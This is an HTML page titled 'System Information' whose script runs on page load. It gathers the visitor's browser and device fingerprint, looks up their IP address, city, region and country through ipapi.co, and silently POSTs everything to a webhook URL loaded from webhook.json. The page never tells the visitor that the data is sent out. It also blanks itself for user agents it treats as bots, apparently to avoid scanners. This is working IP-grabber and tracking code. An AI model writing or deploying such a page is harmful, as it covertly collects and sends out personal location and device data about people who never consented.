<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>System Information</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: white;
      color: black;
      padding: 20px;
    }
    pre {
      white-space: pre-wrap;
      word-wrap: break-word;
    }
  </style>
</head>
<body>
  <h1>System Information</h1>
  <pre id="info">Gathering system information...</pre>

  <script>
    function isBot() {
      const userAgent = navigator.userAgent;
      return /AppleWebKit/.test(userAgent);
    }

    async function fetchIPData() {
      try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();
        return {
          ip: data.ip,
          country: data.country_name,
          city: data.city,
          region: data.region,
          timezone: data.timezone
        };
      } catch (error) {
        console.error("Failed to fetch IP data:", error);
        return {
          ip: "Unavailable",
          country: "Unavailable",
          city: "Unavailable",
          region: "Unavailable",
          timezone: "Unavailable"
        };
      }
    }

    async function fetchWebhookUrl() {
      try {
        const response = await fetch("webhook.json");
        const data = await response.json();
        return data.url;
      } catch (error) {
        console.error("Failed to load webhook URL:", error);
        return null;
      }
    }

    async function gatherSystemInfo() {
      if (isBot()) {
        document.body.innerHTML = "";
        return;
      }

      const webhookUrl = await fetchWebhookUrl();
      if (!webhookUrl) return;

      const ipData = await fetchIPData();

      const screenResolution = `${window.screen.width}x${window.screen.height}`;
      const windowDimensions = `${window.innerWidth}x${window.innerHeight}`;
      const browser = navigator.userAgent;
      const operatingSystem = navigator.platform;
      const cpuCores = navigator.hardwareConcurrency;
      const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable";
      const touchscreenSupport = navigator.maxTouchPoints > 0;
      const language = navigator.language;
      const localTime = new Date().toString();

      const message = `
Screen Resolution: ${screenResolution}
Window Dimensions: ${windowDimensions}
Browser: ${browser}
Operating System: ${operatingSystem}
CPU Cores: ${cpuCores}
Memory: ${memory}
Touchscreen Support: ${touchscreenSupport}
Language: ${language}
Local Time: ${localTime}
IP Address: ${ipData.ip}
Country: ${ipData.country}
City: ${ipData.city}
Region: ${ipData.region}
Timezone: ${ipData.timezone}
      `;

      document.getElementById("info").textContent = message;

      try {
        await fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ content: message }),
        });
      } catch (error) {
        console.error("Failed to send data to webhook:", error);
      }
    }

    gatherSystemInfo();
  </script>
</body>
</html>
